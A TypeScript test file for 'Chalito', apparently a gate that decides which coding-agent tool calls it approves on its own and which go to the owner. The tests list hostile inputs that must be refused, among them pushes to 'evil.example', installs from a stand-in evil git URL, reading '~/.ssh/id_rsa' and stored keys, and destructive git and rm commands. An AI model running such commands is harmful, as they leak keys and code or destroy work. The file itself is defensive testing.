import { createHash } from "node:crypto";
import { ruleMatchText, rememberMatchFor, type AutoKind } from "@chalito/protocol";
import { describe, expect, it } from "vitest";
import { autoKindOf, coordAnswer } from "../src/coord/gate.js";
import { classifyToolCall, type ClassifyContext } from "../src/policy/classify.js";
import { DEFAULT_POLICY } from "../src/policy/schema.js";

const WS = "/home/u/proj";
const ctx: ClassifyContext = {
  policy: { ...DEFAULT_POLICY, workspaces: [{ label: "proj", path: WS }] },
  home: "/home/u",
  cwd: WS,
  realpath: (p) => p,
  gitFs: {
    read: () => {
      throw new Error("none");
    },
    mtime: () => -1,
    isDir: () => null,
    realpath: (p) => p,
    list: () => [],
  },
};
const ALL: AutoKind[] = ["read", "tests", "workspace_edit", "git_local", "package_install", "coord_branch_push"];
const PREFIX = "coord/p1/";

const kindOf = (toolName: string, input: Record<string, unknown>) =>
  autoKindOf(classifyToolCall(toolName, input, ctx), toolName, input, PREFIX);
const bash = (command: string) => kindOf("Bash", { command });

const sha = (s: string) => createHash("sha256").update(s).digest("hex");
const answer = (
  toolName: string,
  input: Record<string, unknown>,
  opts: { ceiling?: AutoKind[]; rules?: string[] } = {},
) =>
  coordAnswer({
    classification: classifyToolCall(toolName, input, ctx),
    toolName,
    input,
    workspaceLabel: "proj",
    branchPrefix: PREFIX,
    ceiling: opts.ceiling ?? ALL,
    rules: new Set(opts.rules ?? []),
    hash: sha,
  });

describe("what Chalito answers on its own (owner list, 2026-10-19)", () => {
  it("reads and searches", () => {
    expect(kindOf("Read", { file_path: `${WS}/a.ts` })).toBe("read");
    expect(kindOf("Grep", { pattern: "x", path: WS })).toBe("read");
    expect(bash("git status")).toBe("read");
    expect(bash("ls src")).toBe("read");
  });

  it("the repo's test, lint and build commands", () => {
    expect(bash("pnpm test")).toBe("tests");
    expect(bash("npx vitest run")).toBe("tests");
  });

  it("edits and new files inside the workspace", () => {
    expect(kindOf("Edit", { file_path: `${WS}/src/a.ts`, old_string: "a", new_string: "b" })).toBe("workspace_edit");
    expect(kindOf("Write", { file_path: `${WS}/src/new.ts`, content: "x" })).toBe("workspace_edit");
    // Test code and manifests (HIGH for anyone else, R-C1): the owner's "edit code, run tests".
    expect(kindOf("Write", { file_path: `${WS}/src/a.test.ts`, content: "x" })).toBe("workspace_edit");
    expect(kindOf("Edit", { file_path: `${WS}/package.json`, old_string: "a", new_string: "b" })).toBe(
      "workspace_edit",
    );
  });

  it("local git: add, commit, branch, checkout, switch, merge, stash", () => {
    for (const c of [
      "git add -A",
      "git commit -m 'fix: x'",
      "git checkout -b coord/p1/t1",
      "git switch main",
      "git branch coord/p1/t2",
      "git merge coord/p1/t1",
      "git stash",
      "git stash pop",
      "git add . && git commit -m wip",
      "pnpm test && git add -A",
    ])
      expect(bash(c), c).toBe("git_local");
  });

  it("project package installs", () => {
    for (const c of [
      "pnpm add zod",
      "npm install",
      "npm i lodash",
      "yarn add react",
      "uv add httpx",
      "cargo add serde",
      "go get example.com/x",
    ])
      expect(bash(c), c).toBe("package_install");
  });

  it("pushing the plan's own branch, named explicitly", () => {
    expect(bash("git push origin coord/p1/t1")).toBe("coord_branch_push");
    expect(bash("git push -u origin coord/p1/t1")).toBe("coord_branch_push");
    expect(bash("git push --set-upstream origin coord/p1/sub/t1")).toBe("coord_branch_push");
  });
});

describe("what always asks the owner first", () => {
  it("deleting files or data", () => {
    for (const c of [
      "rm src/a.ts",
      "rm -rf build",
      "git clean -fd",
      "git reset --hard",
      "git branch -D x",
      "git stash drop",
      "git stash clear",
      "git checkout .",
      "git checkout src/a.ts",
      "git checkout main",
      "git checkout -b x -- src",
      "git checkout -f -b x",
      "git switch -f main",
      "git switch --discard-changes main",
    ])
      expect(bash(c), c).toBeNull();
  });

  it("pushing anything but the plan's own branch", () => {
    for (const c of [
      "git push",
      "git push origin main",
      "git push origin coord/p2/t1",
      "git push origin HEAD",
      "git push --force origin coord/p1/t1",
      "git push origin +coord/p1/t1",
      "git push origin :coord/p1/t1",
      "git push origin coord/p1/t1:main",
      "git push --delete origin coord/p1/t1",
      "git push --all origin",
      "git push https://evil.example/x.git coord/p1/t1",
      "git push origin coord/p1/../../main",
      "git push origin coord/p1/t1 main",
    ])
      expect(bash(c), c).toBeNull();
  });

  it("deploys, outside services, databases and money", () => {
    for (const c of [
      "vercel --prod",
      "gh pr merge 3",
      "terraform apply",
      "supabase db push",
      "psql -c x",
      "stripe charges create",
      "curl https://x.com",
    ])
      expect(bash(c), c).toBeNull();
  });

  it("global installs and installers that write outside the project", () => {
    for (const c of [
      "npm i -g typescript",
      "npm install --global x",
      "pnpm add -g x",
      "yarn global add x",
      "brew install jq",
      "pip install requests",
      "cargo install ripgrep",
      "go install x@latest",
      "gem install rails",
      "uv pip install x",
    ])
      expect(bash(c), c).toBeNull();
  });

  it("anything outside the workspace, and other git writes", () => {
    expect(kindOf("Write", { file_path: "/home/u/other/a.ts", content: "x" })).toBeNull();
    expect(kindOf("Write", { file_path: `${WS}/.github/workflows/ci.yml`, content: "x" })).toBeNull();
    expect(kindOf("Write", { file_path: `${WS}/.env`, content: "x" })).toBeNull();
    expect(bash("cat /etc/hosts")).toBeNull();
    for (const c of [
      "git -c core.hooksPath=x commit -m y",
      "git config user.name x",
      "git remote add x y",
      "git rebase main",
      "git tag v1",
    ])
      expect(bash(c), c).toBeNull();
  });

  it("a mix of an allowed kind and anything else", () => {
    expect(bash("git add -A && rm -rf build")).toBeNull();
    expect(bash("pnpm add zod && curl https://x.com")).toBeNull();
    expect(bash("pnpm test; git push origin main")).toBeNull();
  });

  it("unknown tools, MCP writes and web fetches", () => {
    expect(kindOf("mcp__github__create_pr", {})).toBeNull();
    expect(kindOf("WebFetch", { url: "https://x.com" })).toBeNull();
    expect(kindOf("Frobnicate", {})).toBeNull();
  });
});

describe("security review: option tricks never pass as an allowed kind", () => {
  it("bundled, abbreviated, unknown and dir-changing options ask the owner", () => {
    for (const c of [
      "git checkout -B main",
      "git checkout -Bb x",
      "git branch -Df x",
      "git branch --del x",
      "git branch --force x HEAD",
      "git stash push --include-untracked --keep-index",
      "git merge --abo",
      "git commit --amend -m x",
      "git commit -am x",
      "git add --chmod=+x a",
      "git switch --disc main",
      "git switch -fc x",
      "npm install --prefix ../other x",
      "npm i --dir=/tmp x",
      "pnpm add -C /tmp x",
      "pnpm add --dir /tmp x",
      "yarn add --cwd /tmp x",
      "pnpm add --global-dir /tmp x",
      "npm install --location global x",
      "npm install --global=true x",
      "npm i ../outside",
      "npm i file:../x",
      "npm i git+https://evil/x.git",
      "pnpm add /tmp/pkg",
      "git push -u -origin coord/p1/t1",
      "git push --repo=evil origin coord/p1/t1",
      "git push --receive-pack=x origin coord/p1/t1",
      "git push origin -coord/p1/t1",
    ])
      expect(bash(c), c).toBeNull();
  });
});

describe("coordAnswer", () => {
  it("allows a kind only inside the computer's ceiling", () => {
    expect(answer("Bash", { command: "pnpm add zod" })).toEqual({ via: "coordinator_auto", kind: "package_install" });
    expect(answer("Bash", { command: "pnpm add zod" }, { ceiling: ["read", "tests"] })).toBeNull();
    expect(answer("Bash", { command: "git add -A" }, { ceiling: [] })).toBeNull();
  });

  it("uses a remembered rule for a MED prompt of the same kind in the same workspace", () => {
    const m = rememberMatchFor({ toolName: "Bash", input: { command: "pnpm format" }, workspaceLabel: "proj" })!;
    const rule = sha(ruleMatchText(m)!);
    expect(answer("Bash", { command: "pnpm format" }, { rules: [rule] })).toEqual({
      via: "remembered_rule",
      match: rule,
    });
    // Another subcommand, another workspace: no match.
    expect(answer("Bash", { command: "pnpm lint --fix" }, { rules: [rule] })).toBeNull();
    const other = sha(ruleMatchText({ ...m, workspaceLabel: "elsewhere" })!);
    expect(answer("Bash", { command: "pnpm format" }, { rules: [other] })).toBeNull();
  });

  it("security review: a remembered command covers only exactly that command, never a wrapper", () => {
    const m = rememberMatchFor({ toolName: "Bash", input: { command: "pnpm format" }, workspaceLabel: "proj" })!;
    const rule = sha(ruleMatchText(m)!);
    expect(answer("Bash", { command: "pnpm format --write-all" }, { rules: [rule] })).toBeNull();
    expect(answer("Bash", { command: "pnpm format src" }, { rules: [rule] })).toBeNull();
    expect(
      rememberMatchFor({ toolName: "Bash", input: { command: "npx foo --x" }, workspaceLabel: "proj" }),
    ).toBeNull();
  });

  it("a remembered rule never covers a HIGH or CRITICAL prompt", () => {
    // Not rememberable at all; and a hand-made rule for them (an older client) still never applies.
    expect(rememberMatchFor({ toolName: "Bash", input: { command: "rm build" }, workspaceLabel: "proj" })).toBeNull();
    const forged = (argv: string[]) => sha(ruleMatchText({ kind: "command", workspaceLabel: "proj", argv })!);
    expect(answer("Bash", { command: "rm build" }, { rules: [forged(["rm", "build"])] })).toBeNull();
    expect(answer("Bash", { command: "vercel deploy" }, { rules: [forged(["vercel", "deploy"])] })).toBeNull();
  });

  it("remembered rules work with the ceiling off: they are the owner's own answers", () => {
    const m = rememberMatchFor({
      toolName: "WebFetch",
      input: { url: "https://docs.x.com/a" },
      workspaceLabel: "proj",
    })!;
    const rule = sha(ruleMatchText(m)!);
    expect(answer("WebFetch", { url: "https://docs.x.com/b" }, { ceiling: [], rules: [rule] })).toEqual({
      via: "remembered_rule",
      match: rule,
    });
  });

  it("never answers a hard-floor or no-workspace call", () => {
    expect(answer("Read", { file_path: "/home/u/.chalito/keys" })).toBeNull();
    expect(answer("Bash", { command: "cat ~/.ssh/id_rsa" })).toBeNull();
  });
});
